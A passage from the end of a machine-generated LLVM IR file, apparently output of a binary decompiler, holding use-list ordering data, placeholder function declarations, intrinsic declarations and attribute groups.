1586, 1587, 1588, 1589, 1590, 45, 1591, 1592, 1593, 1594, 1595, 46, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 223, 856, 707, 857, 858, 859, 860, 894, 524, 525, 895, 896, 164, 165, 166, 227, 861, 225, 862, 883, 876, 708, 877, 878, 879, 880, 51, 52, 117, 881, 882, 399, 884, 885, 709, 886, 224, 887, 53, 54, 116, 888, 889, 710, 890, 891, 55, 56, 115, 892, 226, 893, 167, 863, 711, 864, 865, 526, 866, 867, 712, 868, 869, 872, 870, 871, 400, 873, 57, 58, 119, 874, 713, 59, 60, 118, 875, 897, 714, 898, 899, 900, 901, 902, 903, 715, 904, 905, 906, 907, 787, 786, 403, 789, 790, 788, 401, 402, 791, 792, 527, 793, 795, 796, 716, 797, 798, 799, 717, 800, 801, 61, 62, 120, 802, 803, 804, 105, 106, 805, 806, 807, 228, 808, 809, 810, 811, 812, 528, 813, 814, 815, 816, 817, 818, 168, 821, 718, 822, 823, 63, 64, 122, 824, 825, 826, 719, 827, 828, 829, 830, 720, 831, 832, 65, 66, 121, 833, 834, 835, 836, 837, 229, 231, 819, 230, 820, 232, 838, 169, 908, 913, 914, 909, 910, 911, 916, 917, 918, 233, 919, 920, 921, 922, 923, 912, 915, 924, 170, 929, 930, 931, 529, 1056, 530, 932, 1485, 1486, 1487, 234, 1488, 1381, 1380, 1325, 1298, 1227, 934, 933, 935, 1057, 1058, 1059, 1611, 1612, 1613, 1614, 235, 1615, 1616, 1617, 1326, 1327, 428, 429, 531, 1622, 724, 1623, 532, 1624, 1625, 533, 1626, 1627, 722, 236, 405, 1628, 723, 1629, 534, 107, 1630, 1631, 535, 1646, 1647, 1650, 721, 404, 1651, 467, 172, 171, 1648, 1649, 1618, 1619, 725, 237, 388, 774, 13, 14, 1642, 1100, 953, 1641, 1276, 1382, 143, 239, 1383, 726, 238, 1384, 1385, 1632, 1633, 1634, 1635, 536, 1636, 173, 1030, 1031, 67, 68, 123, 1386, 1387, 112, 407, 1391, 1388, 1389, 727, 1390, 1392, 728, 1393, 1394, 1395, 1396, 69, 70, 124, 1397, 240, 1398, 1399, 1400, 1402, 1401, 406, 775, 777, 776, 241, 778, 779, 780, 537, 781, 174, 1620, 1621, 1032, 1033, 1034, 1035, 1036, 1037, 243, 175, 1038, 1039, 1040, 144, 242, 1041, 176, 539, 540, 1637, 538, 177, 178, 1333, 1334, 1335, 1336, 1337, 244, 1338, 1339, 1340, 1341, 1342, 1343, 245, 1328, 541, 1329, 1330, 542, 1331, 1332, 179, 729, 246, 247, 1299, 543, 248, 1300, 1301, 1302, 1303, 1304, 256, 249, 253, 251, 255, 252, 258, 257, 254, 250, 1344, 1345, 1369, 1370, 180, 1346, 1347, 262, 260, 261, 1348, 1349, 268, 267, 193, 259, 1350, 1351, 1352, 1353, 1354, 1355, 435, 434, 468, 544, 1356, 1357, 1358, 108, 1359, 264, 263, 265, 266, 192, 1360, 1361, 408, 1362, 1363, 151, 1364, 1365, 1366, 1367, 1368, 15, 16, 954, 955, 109, 17, 469, 545, 1277, 1278, 1280, 1279, 1252, 1251, 1229, 1228, 957, 956, 1042, 958, 959, 1254, 1253, 1255, 961, 960, 1322, 1652, 1653, 125, 181, 1060, 1061, 1062, 269, 936, 937, 270, 1063, 1068, 1069, 1070, 1071, 271, 1064, 272, 1065, 1066, 1072, 1043, 546, 1230, 1638, 1639, 1640, 962, 964, 963, 1073, 965, 1403, 966, 967, 968, 1643, 1644, 1645, 1067, 18, 1489, 1490, 1491, 149, 1492, 1493, 1494, 1495, 1496, 273, 1497, 730, 733, 731, 732, 1498, 734, 194, 274, 1074, 1075, 145, 422, 1076, 1077, 735, 19, 409, 275, 276, 277, 71, 278, 547, 969, 1078, 1079, 1080, 1307, 1306, 1308, 1309, 1310, 1311, 47, 279, 1312, 1313, 1314, 280, 134, 135, 502, 503, 938, 282, 281, 283, 1081, 284, 1082, 1083, 285, 1371, 1372, 548, 286, 1084, 287, 288, 1131, 289, 1101, 976, 970, 292, 971, 549, 972, 550, 766, 754, 755, 740, 756, 741, 757, 758, 742, 759, 743, 760, 744, 761, 745, 762, 763, 136, 72, 391, 392, 764, 746, 765, 767, 768, 769, 770, 771, 290, 291, 772, 773, 973, 736, 974, 551, 975, 411, 410, 977, 978, 979, 980, 294, 293, 981, 982, 983, 747, 389, 984, 126, 127, 390, 985, 128, 129, 552, 987, 988, 737, 989, 990, 991, 992, 993, 553, 994, 995, 423, 424, 195, 739, 996, 997, 998, 999, 1000, 1001, 738, 1002, 1003, 554, 1004, 555, 1005, 1008, 1009, 1010, 295, 1006, 296, 1007, 297, 986, 939, 940, 941, 138, 73, 942, 137, 74, 943, 944, 556, 945, 557, 946, 558, 947, 948, 950, 298, 299, 949, 425, 75, 130, 436, 951, 300, 20, 952, 1102, 1103, 1011, 559, 1012, 1014, 301, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 303, 302, 1022, 560, 1023, 561, 1024, 562, 1013, 1025, 437, 1028, 563, 1029, 782, 564, 1026, 1027, 565, 308, 307, 748, 182, 310, 309, 749, 183, 312, 311, 750, 184, 314, 313, 751, 185, 316, 315, 752, 186, 753, 306, 305, 304, 413, 426, 414, 415, 416, 417, 566, 1044, 317, 318, 1052, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 412, 1053, 1054, 76, 1055, 319, 567, 146, 1085, 1086, 1087, 1088, 420, 1089, 1090, 1091, 419, 1092, 1093, 1094, 1095, 320, 1096, 1098, 1097, 187, 188, 321, 418, 323, 322, 1099, 324, 325, 110, 326, 329, 1104, 1105, 1106, 1107, 328, 327, 330, 1108, 1109, 77, 78, 196, 150, 331, 111, 569, 1110, 1111, 1112, 1113, 1114, 332, 1115, 1116, 472, 1117, 1118, 1119, 1120, 336, 333, 334, 335, 1121, 1122, 1123, 1124, 570, 1125, 1126, 471, 1127, 568, 1128, 470, 1129, 571, 1130, 338, 1132, 1133, 1134, 1135, 337, 339, 1136, 1137, 79, 80, 139, 1138, 340, 1139, 1140, 475, 1141, 473, 1142, 474, 1143, 344, 1145, 1146, 1147, 1148, 343, 342, 345, 1149, 1150, 81, 82, 1144, 341, 1151, 1152, 346, 1153, 1154, 478, 1155, 477, 1156, 476, 1157, 572, 1158, 574, 140, 83, 1159, 189, 479, 575, 1160, 1161, 347, 348, 1162, 573, 1163, 351, 1164, 1165, 1166, 1167, 350, 349, 352, 1168, 1169, 84, 85, 190, 1170, 1171, 21, 22, 23, 24, 1172, 1173, 353, 481, 1174, 576, 1175, 577, 1176, 578, 1177, 579, 1178, 580, 1179, 581, 1180, 480, 1181, 357, 1183, 1184, 1185, 1186, 355, 354, 358, 1187, 1188, 86, 87, 1182, 356, 1190, 1189, 25, 26, 27, 28, 1191, 359, 1192, 1193, 483, 1194, 582, 1195, 583, 1196, 584, 1197, 585, 1198, 586, 1199, 587, 1200, 482, 1201, 588, 1202, 363, 1204, 1205, 1206, 1207, 361, 360, 364, 1208, 1209, 88, 89, 1203, 362, 1210, 90, 589, 1211, 1213, 1214, 1215, 1216, 590, 1217, 29, 30, 31, 32, 33, 1212, 365, 1218, 1219, 489, 1220, 488, 1221, 487, 1222, 486, 1223, 484, 1224, 485, 1225, 591, 1226, 369, 1232, 1233, 1234, 1235, 367, 366, 370, 1236, 1237, 91, 92, 1231, 368, 1238, 93, 592, 1239, 1241, 1242, 1243, 1244, 593, 1245, 34, 35, 36, 37, 38, 1240, 371, 1246, 1247, 491, 1248, 490, 1249, 594, 1250, 596, 141, 94, 1256, 191, 492, 597, 598, 1257, 1258, 372, 373, 1259, 595, 1262, 1263, 1264, 375, 376, 1265, 1266, 95, 1260, 1261, 374, 1268, 1267, 1269, 377, 1270, 1271, 495, 1272, 494, 1273, 493, 1274, 599, 1275, 1282, 1283, 1284, 379, 380, 381, 1286, 1287, 96, 1285, 1281, 378, 1289, 1290, 1288, 1291, 382, 1292, 1293, 498, 1294, 497, 1295, 496, 1296, 600, 1297, 438, 1305, 1315, 383, 1316, 1323, 384, 1324, 1373, 152, 1374, 1375, 439, 601, 421, 1376, 1377, 48, 427, 1378, 1379, 602, 1404, 385, 1405, 499, 783, 500, 501, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 1654, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668 }
  uselistorder i32* @r4, { 88, 856, 857, 858, 859, 860, 878, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 10, 875, 876, 877, 879, 880, 881, 882, 883, 884, 885, 886, 95, 96, 97, 98, 141, 11, 142, 143, 144, 12, 145, 146, 147, 148, 149, 150, 151, 0, 13, 152, 153, 154, 155, 156, 157, 158, 159, 218, 219, 887, 89, 90, 91, 889, 890, 891, 5, 894, 61, 888, 775, 776, 99, 100, 101, 102, 103, 104, 105, 106, 107, 895, 896, 160, 161, 14, 4, 162, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 15, 163, 164, 165, 166, 167, 168, 169, 170, 189, 16, 190, 191, 171, 172, 174, 17, 175, 178, 18, 179, 180, 19, 181, 182, 20, 183, 184, 21, 185, 186, 22, 187, 58, 188, 173, 192, 23, 193, 194, 195, 196, 197, 198, 199, 176, 177, 92, 93, 94, 108, 109, 110, 111, 24, 112, 25, 26, 113, 114, 115, 116, 117, 118, 119, 124, 125, 27, 126, 127, 28, 128, 129, 29, 130, 131, 30, 132, 133, 31, 134, 135, 32, 136, 137, 120, 121, 122, 123, 138, 139, 140, 200, 201, 202, 33, 203, 204, 205, 34, 206, 207, 208, 209, 210, 211, 56, 212, 213, 214, 215, 216, 217, 220, 221, 222, 223, 380, 224, 892, 893, 838, 839, 840, 841, 842, 843, 739, 740, 381, 382, 913, 914, 915, 780, 781, 60, 918, 57, 919, 920, 921, 937, 939, 940, 941, 938, 922, 927, 935, 936, 916, 928, 929, 930, 931, 62, 844, 845, 6, 35, 846, 36, 847, 848, 849, 923, 924, 850, 79, 80, 81, 82, 83, 84, 917, 925, 926, 225, 226, 227, 228, 782, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 37, 798, 799, 800, 801, 783, 784, 785, 741, 742, 743, 744, 745, 746, 747, 748, 749, 38, 750, 751, 752, 753, 754, 755, 756, 757, 758, 802, 824, 825, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 59, 816, 817, 1, 818, 819, 820, 821, 822, 823, 248, 249, 250, 707, 708, 709, 710, 711, 714, 715, 716, 63, 712, 713, 663, 664, 665, 666, 667, 668, 669, 614, 615, 616, 619, 620, 621, 617, 618, 251, 252, 253, 254, 255, 256, 257, 64, 258, 259, 670, 671, 672, 673, 674, 675, 676, 260, 261, 262, 263, 264, 265, 65, 383, 384, 385, 386, 387, 388, 389, 229, 230, 231, 390, 391, 392, 393, 9, 394, 395, 396, 397, 398, 399, 400, 266, 267, 268, 271, 272, 273, 269, 270, 274, 275, 276, 277, 278, 279, 932, 933, 934, 280, 281, 282, 401, 402, 403, 404, 405, 283, 284, 285, 286, 287, 288, 289, 290, 464, 465, 423, 424, 77, 78, 291, 292, 293, 294, 68, 69, 66, 67, 70, 71, 72, 73, 74, 75, 76, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 313, 314, 315, 316, 323, 324, 325, 326, 327, 7, 317, 318, 319, 320, 321, 322, 309, 310, 311, 312, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 717, 718, 425, 426, 427, 428, 429, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 347, 348, 349, 350, 351, 352, 85, 86, 341, 342, 343, 344, 345, 346, 353, 39, 40, 41, 42, 43, 44, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 406, 407, 8, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 45, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 2, 503, 504, 505, 506, 507, 508, 509, 510, 46, 511, 47, 512, 48, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 49, 537, 50, 538, 51, 539, 52, 540, 541, 542, 543, 53, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 54, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 55, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 677, 678, 679, 3, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 777, 778, 779, 826, 827, 830, 828, 829, 831, 832, 833, 834, 835, 836, 837, 851, 852, 853, 854, 87, 855 }
}

declare i32 @__libc_errno() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
